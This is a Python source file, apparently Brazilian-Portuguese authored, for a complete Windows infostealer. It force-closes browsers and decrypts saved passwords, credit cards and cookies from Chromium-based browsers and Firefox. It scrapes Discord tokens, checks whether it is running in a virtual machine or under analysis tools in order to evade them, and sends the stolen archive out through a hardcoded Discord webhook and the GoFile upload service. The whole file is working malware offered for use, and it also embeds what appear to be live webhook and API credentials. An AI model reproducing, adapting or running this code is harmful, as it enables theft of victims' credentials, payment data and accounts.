import os
import re
import json
import sqlite3
import shutil
import platform
import subprocess
import socket
import requests
import psutil
import asyncio
import aiohttp
import win32crypt
import hmac
import base64
import random
from datetime import datetime, timedelta
from Crypto.Cipher import DES3, AES
from pyasn1.codec.der import decoder
from hashlib import sha1, pbkdf2_hmac
from Crypto.Util.Padding import unpad
from base64 import b64decode
from discord import Webhook, File

# Configurações
DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1401234043365884005/xLNxP5uhCvgaEIlQLkcYtYGp-BXMCBQJoXcsU5hAPWnfZ5T8EJG2ujPPg9RN99oTNr41'
GOFILE_API_KEY = 'toQ6qI1pDVCV6AlqDBLiXAGpvsfW2Oat'  # Opcional, pode deixar vazio

class CookieStealer:
    def __init__(self):
        self.hostname = os.getenv("COMPUTERNAME")
        self.usernamex = os.getlogin()
        self.windows_version = platform.platform()
        self.now = datetime.now()
        
        response = requests.get("https://ipinfo.io").text
        ip_country = json.loads(response)
        self.name_country = ip_country['region']
        self.timezone = ip_country['timezone']
        self.city = ip_country['city']
        self.ip = ip_country['ip']
        self.country_code = ip_country['country']
        
        newtime = str(self.now.hour) + "h" + str(self.now.minute) + "m" + str(self.now.second) + "s" + "-" + str(self.now.day) + "-" + str(self.now.month) + "-" + str(self.now.year)
        self.name_f = self.country_code + " " + self.ip + " " + newtime
        self.data_path = os.path.join(os.environ["TEMP"], self.name_f)

    def find_profile(self, path_userdata):
        profile_path = []
        for name in os.listdir(path_userdata):
            if name.startswith("Profile") or name == 'Default':
                dir_path = os.path.join(path_userdata, name)
                profile_path.append(dir_path)
        return profile_path

    def get_chrome(self, chrome_path):
        data_chrome = os.path.join(self.data_path, "Chrome")
        os.mkdir(data_chrome)
        profiles = self.find_profile(chrome_path)
        for i, profile in enumerate(profiles, 1):
            os.mkdir(os.path.join(data_chrome, "profile" + str(i)))
            self.copy_browser_files(profile, os.path.join(data_chrome, "profile" + str(i)))
            self.delete_file("Chrome", "profile" + str(i))

    def get_edge(self, edge_path):
        data_edge = os.path.join(self.data_path, "Edge")
        os.mkdir(data_edge)
        profiles = self.find_profile(edge_path)
        for i, profile in enumerate(profiles, 1):
            os.mkdir(os.path.join(data_edge, "profile" + str(i)))
            self.copy_browser_files(profile, os.path.join(data_edge, "profile" + str(i)))
            self.delete_file("Edge", "profile" + str(i))

    def get_brave(self, brave_path):
        data_brave = os.path.join(self.data_path, "Brave")
        os.mkdir(data_brave)
        profiles = self.find_profile(brave_path)
        for i, profile in enumerate(profiles, 1):
            os.mkdir(os.path.join(data_brave, "profile" + str(i)))
            self.copy_browser_files(profile, os.path.join(data_brave, "profile" + str(i)))
            self.delete_file("Brave", "profile" + str(i))

    def get_opera(self, opera_path):
        data_opera = os.path.join(self.data_path, "Opera")
        os.mkdir(data_opera)
        self.copy_browser_files(opera_path, data_opera)
        self.delete_file("Opera", "")

    def get_chromium(self, chromium_path):
        data_chromium = os.path.join(self.data_path, "Chromium")
        os.mkdir(data_chromium)
        profiles = self.find_profile(chromium_path)
        for i, profile in enumerate(profiles, 1):
            os.mkdir(os.path.join(data_chromium, "profile" + str(i)))
            self.copy_browser_files(profile, os.path.join(data_chromium, "profile" + str(i)))
            self.delete_file("Chromium", "profile" + str(i))

    def find_profile_firefox(self, firefox_path):
        profile_path = []
        for name in os.listdir(firefox_path):
            dir_path = os.path.join(firefox_path, name)
            profile_path.append(dir_path)
        return profile_path

    def get_firefox(self, firefox_path):
        data_firefox = os.path.join(self.data_path, 'firefox')
        os.mkdir(data_firefox)
        profiles = self.find_profile_firefox(firefox_path)
        for i, profile in enumerate(profiles, 1):
            os.mkdir(os.path.join(data_firefox, "profile" + str(i)))
            self.copy_firefox_files(profile, os.path.join(data_firefox, "profile" + str(i)))
            if os.path.exists(os.path.join(data_firefox, "profile" + str(i), 'cookies.sqlite')):
                self.delete_firefox(os.path.join(data_firefox, "profile" + str(i)))
            else:
                shutil.rmtree(os.path.join(data_firefox, "profile" + str(i)))

    def copy_browser_files(self, src_profile, dst_profile):
        try:
            if os.path.exists(os.path.join(src_profile, 'Network', 'Cookies')):
                shutil.copyfile(os.path.join(src_profile, 'Network', 'Cookies'), os.path.join(dst_profile, 'Cookies'))
            if os.path.exists(os.path.join(src_profile, 'Login Data')):
                shutil.copyfile(os.path.join(src_profile, 'Login Data'), os.path.join(dst_profile, 'Login Data'))
            if os.path.exists(os.path.join(src_profile, 'Web Data')):
                shutil.copyfile(os.path.join(src_profile, 'Web Data'), os.path.join(dst_profile, 'Web Data'))
            if os.path.exists(os.path.join(os.path.dirname(src_profile), 'Local State')):
                shutil.copyfile(os.path.join(os.path.dirname(src_profile), 'Local State'), os.path.join(dst_profile, 'Local State'))
        except Exception as e:
            print(f"Error copying files: {e}")

    def copy_firefox_files(self, src_profile, dst_profile):
        try:
            if os.path.exists(os.path.join(src_profile, 'cookies.sqlite')):
                shutil.copyfile(os.path.join(src_profile, 'cookies.sqlite'), os.path.join(dst_profile, 'cookies.sqlite'))
            if os.path.exists(os.path.join(src_profile, 'key4.db')):
                shutil.copyfile(os.path.join(src_profile, 'key4.db'), os.path.join(dst_profile, 'key4.db'))
            if os.path.exists(os.path.join(src_profile, 'logins.json')):
                shutil.copyfile(os.path.join(src_profile, 'logins.json'), os.path.join(dst_profile, 'logins.json'))
        except Exception as e:
            print(f"Error copying Firefox files: {e}")

    def encrypt(self, name_bz, name_profile):
        try:
            key_db = os.path.join(self.data_path, name_bz, name_profile, "Local State")
            login_db = os.path.join(self.data_path, name_bz, name_profile, "Login Data")
            cookie_db = os.path.join(self.data_path, name_bz, name_profile, "Cookies")
            credit_db = os.path.join(self.data_path, name_bz, name_profile, "Web Data")

            with open(key_db, "r", encoding="utf-8") as f:
                local_state = json.loads(f.read())

            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
            master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]

            # Decrypt passwords
            if os.path.exists(login_db):
                conn = sqlite3.connect(login_db)
                cursor = conn.cursor()
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                for r in cursor.fetchall():
                    url, username, encrypted_password = r
                    if encrypted_password:
                        iv = encrypted_password[3:15]
                        payload = encrypted_password[15:]
                        cipher = AES.new(master_key, AES.MODE_GCM, iv)
                        decrypted_pass = cipher.decrypt(payload)[:-16].decode()
                        with open(os.path.join(self.data_path, "password.txt"), 'a', encoding='utf-8') as f:
                            f.write(f"URL: {url}\nUSERNAME: {username}\nPASS: {decrypted_pass}\n\nAPPLICATION: {name_bz}-{name_profile}\n\n{'*'*50}\n\n")

            # Decrypt credit cards
            if os.path.exists(credit_db):
                db_cre = sqlite3.connect(credit_db)
                cursor_credit = db_cre.cursor()
                cursor_credit.execute("SELECT * FROM credit_cards")
                for row1 in cursor_credit.fetchall():
                    encrypted_credit = row1[4]
                    if encrypted_credit:
                        iv1 = encrypted_credit[3:15]
                        payload1 = encrypted_credit[15:]
                        cipher = AES.new(master_key, AES.MODE_GCM, iv1)
                        decrypted_cre = cipher.decrypt(payload1)[:-16].decode()
                        with open(os.path.join(self.data_path, "credit.txt"), 'a', encoding='utf-8') as f:
                            f.write(f"Card number: {decrypted_cre}\nExpiration date: {row1[2]}/{row1[3]}\nName: {row1[1]}\nNickname: {row1[10]}\n\n")

            # Decrypt cookies
            if os.path.exists(cookie_db):
                conn2 = sqlite3.connect(cookie_db)
                conn2.text_factory = lambda b: b.decode(errors="ignore")
                cursor2 = conn2.cursor()
                cursor2.execute("SELECT host_key, name, value, encrypted_value, is_httponly, is_secure, expires_utc FROM cookies")
                
                json_data = []
                for host_key, name, value, encrypted_value, is_httponly, is_secure, expires_utc in cursor2.fetchall():
                    decrypted_value = value
                    if not value and encrypted_value:
                        iv = encrypted_value[3:15]
                        encrypted_value = encrypted_value[15:]
                        cipher = AES.new(master_key, AES.MODE_GCM, iv)
                        decrypted_value = cipher.decrypt(encrypted_value)[:-16].decode()
                    
                    httponly = "TRUE" if is_httponly == 1 else "FALSE"
                    secure = "TRUE" if is_secure == 1 else "FALSE"
                    cookie = f"{host_key}\t{httponly}\t{'/'}\t{secure}\t\t{name}\t{decrypted_value}\n"
                    
                    x_nameck = name_bz + "-" + name_profile + ".txt"
                    with open(os.path.join(self.data_path, "filecookie", x_nameck), 'a') as f:
                        f.write(cookie)

        except Exception as e:
            print(f"Error decrypting data: {e}")

    def delete_file(self, name_bz, name_profile):
        try:
            self.encrypt(name_bz, name_profile)
        except Exception as e:
            print(f"Error in delete_file: {e}")

    def decryptMoz3DES(self, globalSalt, entrySalt, encryptedData):
        hp = sha1(globalSalt).digest()
        pes = entrySalt + b'\x00'*(20-len(entrySalt))
        chp = sha1(hp+entrySalt).digest()
        k1 = hmac.new(chp, pes+entrySalt, sha1).digest()
        tk = hmac.new(chp, pes, sha1).digest()
        k2 = hmac.new(chp, tk+entrySalt, sha1).digest()
        k = k1+k2
        iv = k[-8:]
        key = k[:24]
        return DES3.new(key, DES3.MODE_CBC, iv).decrypt(encryptedData)

    def decodeLoginData(self, data):
        asn1data = decoder.decode(b64decode(data))
        key_id = asn1data[0][0].asOctets()
        iv = asn1data[0][1][1].asOctets()
        ciphertext = asn1data[0][2].asOctets()
        return key_id, iv, ciphertext

    def getLoginData(self, afkk):
        logins = []
        json_file = os.path.join(afkk, "logins.json")
        if os.path.exists(json_file):
            try:
                jsonLogins = json.loads(open(json_file, 'r', encoding='utf-8').read())
                for row in jsonLogins['logins']:
                    encUsername = row['encryptedUsername']
                    encPassword = row['encryptedPassword']
                    logins.append((self.decodeLoginData(encUsername), self.decodeLoginData(encPassword), row['hostname']))
            except Exception as e:
                print(f"Error reading logins.json: {e}")
        return logins

    def decryptPBE(self, decodedItem, globalSalt):
        pbeAlgo = str(decodedItem[0][0][0])
        if pbeAlgo == '1.2.840.113549.1.12.5.1.3':
            entrySalt = decodedItem[0][0][1][0].asOctets()
            cipherT = decodedItem[0][1].asOctets()
            key = self.decryptMoz3DES(globalSalt, entrySalt, cipherT)
            return key[:24]
        elif pbeAlgo == '1.2.840.113549.1.5.13':
            entrySalt = decodedItem[0][0][1][0][1][0].asOctets()
            iterationCount = int(decodedItem[0][0][1][0][1][1])
            keyLength = int(decodedItem[0][0][1][0][1][2])
            k = sha1(globalSalt).digest()
            key = pbkdf2_hmac('sha256', k, entrySalt, iterationCount, dklen=keyLength)
            iv = b'\x04\x0e'+decodedItem[0][0][1][1][1].asOctets()
            cipherT = decodedItem[0][1].asOctets()
            clearText = AES.new(key, AES.MODE_CBC, iv).decrypt(cipherT)
            return clearText

    def getKey(self, afk):
        try:
            conn = sqlite3.connect(os.path.join(afk, "key4.db"))
            c = conn.cursor()
            c.execute("SELECT item1,item2 FROM metadata;")
            row = c.fetchone()
            globalSalt = row[0]
            item2 = row[1]
            decodedItem2 = decoder.decode(item2)
            clearText = self.decryptPBE(decodedItem2, globalSalt)
            
            if clearText == b'password-check\x02\x02':
                c.execute("SELECT a11,a102 FROM nssPrivate;")
                for row in c:
                    if row[0] is not None:
                        break
                a11 = row[0]
                a102 = row[1]
                if a102 is not None:
                    decoded_a11 = decoder.decode(a11)
                    clearText = self.decryptPBE(decoded_a11, globalSalt)
                    return clearText[:24]
            return None
        except Exception as e:
            print(f"Error getting key: {e}")
            return None

    def encrypt_firefox(self, path_f):
        try:
            if os.path.exists(os.path.join(path_f, "logins.json")):
                key = self.getKey(path_f)
                if key:
                    logins = self.getLoginData(path_f)
                    for i in logins:
                        username = unpad(DES3.new(key, DES3.MODE_CBC, i[0][1]).decrypt(i[0][2]), 8)
                        password = unpad(DES3.new(key, DES3.MODE_CBC, i[1][1]).decrypt(i[1][2]), 8)
                        str_pass = password.decode('utf-8')
                        str_user = username.decode('utf-8')
                        with open(os.path.join(path_f, "password.txt"), 'a', encoding='utf-8') as f:
                            f.write(f"{i[2]}          {str_user}|{str_pass}\n")
        except Exception as e:
            print(f"Error encrypting Firefox: {e}")

        try:
            db_path = os.path.join(path_f, "cookies.sqlite")
            if os.path.exists(db_path):
                db = sqlite3.connect(db_path)
                db.text_factory = lambda b: b.decode(errors="ignore")
                cursor = db.cursor()
                cursor.execute("SELECT id, name, value, host FROM moz_cookies")
                
                with open(os.path.join(path_f, "cookie.txt"), 'a') as f:
                    for id, name, value, host in cursor.fetchall():
                        cookie = f"{host}\t\t{'/'}\t\t\t{name}\t{value}\n"
                        f.write(cookie)
        except Exception as e:
            print(f"Error processing Firefox cookies: {e}")

    def delete_firefox(self, data_firefox_profile):
        try:
            self.encrypt_firefox(data_firefox_profile)
        except Exception as e:
            print(f"Error in delete_firefox: {e}")

    def get_browser_data(self):
        browsers = {
            'chrome': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data"),
            'Edge': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data"),
            'Opera': os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera Stable"),
            'Brave': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
            'firefox': os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Mozilla", "Firefox", "Profiles"),
            'chromium': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Chromium", "User Data")
        }

        os.mkdir(self.data_path)
        os.mkdir(os.path.join(self.data_path, "filecookie"))

        for browser_name, browser_path in browsers.items():
            try:
                if os.path.exists(browser_path):
                    if browser_name == 'chrome':
                        self.get_chrome(browser_path)
                    elif browser_name == 'Edge':
                        self.get_edge(browser_path)
                    elif browser_name == 'Opera':
                        self.get_opera(browser_path)
                    elif browser_name == 'Brave':
                        self.get_brave(browser_path)
                    elif browser_name == 'firefox':
                        self.get_firefox(browser_path)
                    elif browser_name == 'chromium':
                        self.get_chromium(browser_path)
            except Exception as e:
                print(f"Error extracting data from {browser_name}: {e}")

        zip_file_path = os.path.join(os.environ["TEMP"], self.name_f + '.zip')
        shutil.make_archive(zip_file_path[:-4], 'zip', self.data_path)
        return zip_file_path

class VMAnalyzer:
    def __init__(self):
        self.vm_processes = [
            'vmtoolsd.exe', 'vmwaretray.exe', 'vmwareuser.exe', 
            'vgauthservice.exe', 'vmacthlp.exe', 'vboxservice.exe',
            'vboxtray.exe', 'xenservice.exe', 'qemu-ga.exe',
            'ProcessHacker.exe', 'httpdebuggerui.exe', 'wireshark.exe',
            'fiddler.exe', 'regedit.exe', 'cmd.exe', 'taskmgr.exe',
            'df5serv.exe', 'processhacker.exe', 'ida64.exe', 'ollydbg.exe'
        ]
        
        self.vm_mac_prefixes = [
            '00:05:69', '00:0C:29', '00:1C:14', '00:50:56', 
            '08:00:27', '0A:00:27', '00:16:3E', '00:03:FF'
        ]
        
        self.vm_usernames = ['sandbox', 'vmware', 'virtualbox', 'qemu', 'xen', 'user']
        self.vm_hostnames = ['vmware', 'virtualbox', 'sandbox', 'malware', 'test']
        self.vm_gpu_models = ['virtualbox', 'vmware', 'qxl', 'cirrus', 'virtual gpu']

    def check_processes(self):
        try:
            output = subprocess.check_output('tasklist /NH /FO CSV', shell=True, 
                                          stderr=subprocess.PIPE, 
                                          stdin=subprocess.PIPE).decode('latin-1').lower()
            return any(proc.lower() in output for proc in self.vm_processes)
        except Exception as e:
            print('Erro ao verificar processos:', e)
            return False

    def check_mac_address(self):
        try:
            for iface, addrs in psutil.net_if_addrs().items():
                for addr in addrs:
                    if addr.family == psutil.AF_LINK and addr.address:
                        mac = addr.address.lower()
                        return any(mac.startswith(prefix.lower()) for prefix in self.vm_mac_prefixes)
            return False
        except Exception as e:
            print('Erro ao verificar MAC:', e)
            return False

    def check_username(self):
        try:
            username = os.getlogin().lower()
            return any(name.lower() in username for name in self.vm_usernames)
        except Exception as e:
            print('Erro ao verificar usuário:', e)
            return False

    def check_hostname(self):
        try:
            hostname = socket.gethostname().lower()
            return any(name.lower() in hostname for name in self.vm_hostnames)
        except Exception as e:
            print('Erro ao verificar hostname:', e)
            return False

    def check_gpu(self):
        try:
            gpu = subprocess.check_output('wmic path win32_videocontroller get name /value', 
                                       shell=True, 
                                       stderr=subprocess.PIPE, 
                                       stdin=subprocess.PIPE).decode('latin-1').lower()
            return any(model.lower() in gpu for model in self.vm_gpu_models)
        except Exception as e:
            print('Erro ao verificar GPU:', e)
            return False

    def perform_checks(self):
        checks = [
            self.check_processes(),
            self.check_mac_address(),
            self.check_username(),
            self.check_hostname(),
            self.check_gpu()
        ]
        
        print('Resultados da análise:', {
            'processos': checks[0],
            'mac': checks[1],
            'usuario': checks[2],
            'hostname': checks[3],
            'gpu': checks[4]
        })
        
        # Requer pelo menos 2 detecções positivas
        return sum(checks) >= 2

class FileUploader:
    @staticmethod
    async def upload_to_gofile(file_path):
        try:
            url = 'https://upload.gofile.io/uploadfile'
            headers = {
                "Authorization": f"Bearer {GOFILE_API_KEY}"
            }
            with open(file_path, 'rb') as f:
                files = {'file': f}
                response = requests.post(url, headers=headers, files=files)

            if response.status_code == 200:
                res_json = response.json()
                if res_json.get('status') == 'ok':
                    return res_json['data']['downloadPage']
                else:
                    print(f"[GoFile] Erro da API: {res_json.get('status')}")
            else:
                print(f"[GoFile] Erro HTTP: {response.status_code}")
        except Exception as e:
            print(f"[GoFile] Erro inesperado: {e}")
        
        return None

class SystemScanner:
    def __init__(self):
        self.webhook_url = DISCORD_WEBHOOK_URL

    async def close_browsers(self):
        try:
            subprocess.call('taskkill /F /IM msedge.exe /IM chrome.exe /IM firefox.exe /IM opera.exe /IM brave.exe /IM discord.exe', 
                          shell=True, 
                          stderr=subprocess.DEVNULL, 
                          stdin=subprocess.DEVNULL)
            await asyncio.sleep(2)
        except Exception:
            pass

    async def get_public_ip(self):
        try:
            response = requests.get('https://api.ipify.org?format=json', timeout=5)
            return response.json().get('ip', 'N/A')
        except Exception:
            try:
                response = requests.get('http://ip-api.com/json', timeout=3)
                return response.json().get('query', 'N/A')
            except Exception:
                return 'N/A'

    async def gather_system_info(self):
        try:
            cpu = platform.processor()
            ram = f"{psutil.virtual_memory().total / (1024 ** 3):.2f} GB"
            
            try:
                gpu = subprocess.check_output('wmic path win32_videocontroller get name /value', 
                                           shell=True, 
                                           stderr=subprocess.PIPE, 
                                           stdin=subprocess.PIPE).decode('latin-1').split('\n')[1] or 'N/A'
            except Exception:
                gpu = 'N/A'
                
            return {
                'cpu': cpu,
                'ram': ram,
                'gpu': gpu,
                'arch': platform.architecture()[0],
                'win_ver': platform.version(),
                'ip': await self.get_public_ip()
            }
        except Exception as e:
            print('Erro ao coletar informações:', e)
            return {}

    def find_discord_tokens(self, path):
        tokens = []
        try:
            for root, _, files in os.walk(path):
                for file in files:
                    file_path = os.path.join(root, file)
                    try:
                        if file.endswith(('.log', '.ldb', '.sqlite', '.db', '.txt')):
                            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                                found_tokens = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}', content)
                                if found_tokens:
                                    tokens.extend(found_tokens)
                    except Exception:
                        continue
        except Exception:
            pass
        return tokens

    def get_browser_cookies(self, browser_path):
        cookies = []
        try:
            cookie_db = os.path.join(browser_path, "Network", "Cookies")
            if not os.path.exists(cookie_db):
                return cookies

            temp_db = os.path.join(os.getenv("TEMP"), "temp_cookie_db")
            shutil.copy2(cookie_db, temp_db)

            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, path FROM cookies")
            
            for row in cursor.fetchall():
                cookies.append({
                    'host': row[0],
                    'name': row[1],
                    'path': row[2]
                })

            cursor.close()
            conn.close()
            os.remove(temp_db)
        except Exception as e:
            print(f"Erro ao extrair cookies: {e}")
        
        return cookies

    async def scan_for_data(self):
        local = os.getenv('LOCALAPPDATA')
        roaming = os.getenv('APPDATA')
        
        paths = {
            'Discord': os.path.join(roaming, 'Discord'),
            'Discord Canary': os.path.join(roaming, 'discordcanary'),
            'Discord PTB': os.path.join(roaming, 'discordptb'),
            'Chrome': os.path.join(local, 'Google', 'Chrome', 'User Data', 'Default'),
            'Edge': os.path.join(local, 'Microsoft', 'Edge', 'User Data', 'Default'),
            'Opera': os.path.join(roaming, 'Opera Software', 'Opera Stable'),
            'Opera GX': os.path.join(roaming, 'Opera Software', 'Opera GX Stable'),
            'Brave': os.path.join(local, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
            'Yandex': os.path.join(local, 'Yandex', 'YandexBrowser', 'User Data', 'Default'),
            'Vivaldi': os.path.join(local, 'Vivaldi', 'User Data', 'Default')
        }

        results = {
            'tokens': {},
            'cookies': {}
        }
        
        await self.close_browsers()
        
        # Busca tokens do Discord
        for app, path in paths.items():
            if 'Discord' in app and os.path.exists(path):
                tokens = self.find_discord_tokens(path)
                if tokens:
                    results['tokens'][app] = tokens
        
        # Busca tokens do Discord nos navegadores
        for browser, path in paths.items():
            if 'Discord' not in browser and os.path.exists(path):
                leveldb_path = os.path.join(path, "Local Storage", "leveldb")
                if os.path.exists(leveldb_path):
                    tokens = self.find_discord_tokens(leveldb_path)
                    if tokens:
                        results['tokens'][f"{browser} (Discord tokens)"] = tokens
        
        # Busca cookies dos navegadores
        for browser, path in paths.items():
            if 'Discord' not in browser and os.path.exists(path):
                cookies = self.get_browser_cookies(path)
                if cookies:
                    results['cookies'][browser] = cookies
        
        return results

    async def send_webhook_message(self, content, files=None):
        try:
            async with aiohttp.ClientSession() as session:
                webhook = Webhook.from_url(self.webhook_url, session=session)
                
                if files:
                    await webhook.send(content=content, files=files)
                else:
                    await webhook.send(content=content)
                    
        except Exception as e:
            print(f'Erro ao enviar webhook: {e}')

    async def prepare_report(self, system_info, scan_results, cookie_zip=None):
        # Envia informações do sistema
        system_msg = "**Informações do Sistema**\n"
        system_msg += f"```\n"
        system_msg += f"OS: {platform.system()} {platform.release()}\n"
        system_msg += f"Usuário: {os.getlogin()}\n"
        system_msg += f"Host: {socket.gethostname()}\n"
        system_msg += f"IP: {system_info.get('ip', 'N/A')}\n"
        system_msg += f"CPU: {system_info.get('cpu', 'N/A')}\n"
        system_msg += f"RAM: {system_info.get('ram', 'N/A')}\n"
        system_msg += f"GPU: {system_info.get('gpu', 'N/A')}\n"
        system_msg += f"```"
        
        await self.send_webhook_message(system_msg)

        # Envia cookies se existirem
        if cookie_zip:
            # Faz upload para GoFile
            gofile_url = await FileUploader.upload_to_gofile(cookie_zip)
            
            if gofile_url:
                await self.send_webhook_message(f"**Cookies e senhas encontrados**\n{gofile_url}")
            else:
                # Fallback para webhook se GoFile falhar
                with open(cookie_zip, 'rb') as f:
                    await self.send_webhook_message(
                        "**Cookies e senhas encontrados**",
                        files=[File(f, filename=os.path.basename(cookie_zip))]
                    )
            
            # Remove arquivo temporário
            os.remove(cookie_zip)

        # Processa tokens encontrados
        if scan_results['tokens']:
            all_tokens = []
            for source, tokens in scan_results['tokens'].items():
                if tokens:
                    all_tokens.extend(tokens)
            
            if all_tokens:
                # Remove duplicatas mantendo a ordem
                unique_tokens = []
                seen = set()
                for token in all_tokens:
                    if token not in seen:
                        seen.add(token)
                        unique_tokens.append(token)
                
                # Cria arquivo com TODOS os tokens encontrados
                token_file = "all_tokens.txt"
                with open(token_file, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(unique_tokens))
                
                # Faz upload para GoFile
                gofile_url = await FileUploader.upload_to_gofile(token_file)
                
                if gofile_url:
                    await self.send_webhook_message(f"**Tokens encontrados**\n{gofile_url}")
                else:
                    # Fallback para webhook se GoFile falhar
                    with open(token_file, 'rb') as f:
                        await self.send_webhook_message(
                            "**Tokens encontrados**",
                            files=[File(f, filename=token_file)]
                        )
                
                # Remove arquivo temporário
                os.remove(token_file)

        # Processa cookies encontrados
        if scan_results['cookies']:
            cookies_file = "all_cookies.json"
            with open(cookies_file, 'w', encoding='utf-8') as f:
                json.dump(scan_results['cookies'], f, indent=4)
            
            # Faz upload para GoFile
            gofile_url = await FileUploader.upload_to_gofile(cookies_file)
            
            if gofile_url:
                await self.send_webhook_message(f"**Cookies encontrados**\n{gofile_url}")
            else:
                # Fallback para webhook se GoFile falhar
                with open(cookies_file, 'rb') as f:
                    await self.send_webhook_message(
                        "**Cookies encontrados**",
                        files=[File(f, filename=cookies_file)]
                    )
            
            # Remove arquivo temporário
            os.remove(cookies_file)

async def main():
    try:
        if platform.system() != 'Windows':
            print('Windows required')
            return

        vm_check = VMAnalyzer()
        if vm_check.perform_checks():
            print('Virtual environment detected')
            return

        # Inicia o scanner
        scanner = SystemScanner()
        
        # Fecha os navegadores primeiro
        await scanner.close_browsers()
        
        # Coleta cookies e senhas
        cookie_stealer = CookieStealer()
        cookie_zip = cookie_stealer.get_browser_data()
        
        # Coleta informações do sistema e escaneia outros dados
        system_info = await scanner.gather_system_info()
        scan_results = await scanner.scan_for_data()
        
        if scan_results['tokens'] or scan_results['cookies'] or cookie_zip:
            await scanner.prepare_report(system_info, scan_results, cookie_zip)
        
    except Exception as e:
        print('Error:', e)

if __name__ == '__main__':
    if platform.system() == 'Windows':
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    
    asyncio.run(main())
